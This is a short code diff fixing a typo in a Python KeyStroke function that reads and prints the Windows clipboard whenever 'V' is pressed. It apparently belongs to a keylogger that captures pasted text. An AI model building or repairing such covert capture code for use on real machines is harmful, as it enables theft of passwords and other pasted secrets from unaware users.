@@ -52,7 +52,7 @@ def KeyStroke():
 		if event.Key == "V":
 
 			win32clipboard.OpenClipboard()
-			pasted_value = win32clipboard.GetlipboardData()
+			pasted_value = win32clipboard.GetClipboardData()
 			win32clipboard.CloseClipboard()
 
 			print ("[PASTE] - %s" % (pasted_value),)
